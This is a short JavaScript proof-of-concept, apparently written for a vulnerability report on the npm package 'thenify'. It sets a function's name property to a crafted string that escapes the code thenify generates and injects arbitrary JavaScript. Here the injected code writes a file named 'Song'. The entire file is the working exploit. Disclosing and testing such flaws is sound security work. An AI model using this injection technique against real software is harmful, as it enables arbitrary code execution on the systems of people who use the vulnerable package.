var a = require("thenify");
var attack_code = "fs=require('fs');fs.writeFile('Song', 'test',function(){})";
// var attack_code = "ppppppppppppppooooooooooooooocccccccccccccccc";
function cur(){};
Object.defineProperty(cur, "name", { value: "fake() {" + attack_code + ";})();(function(){//"});
a(cur);

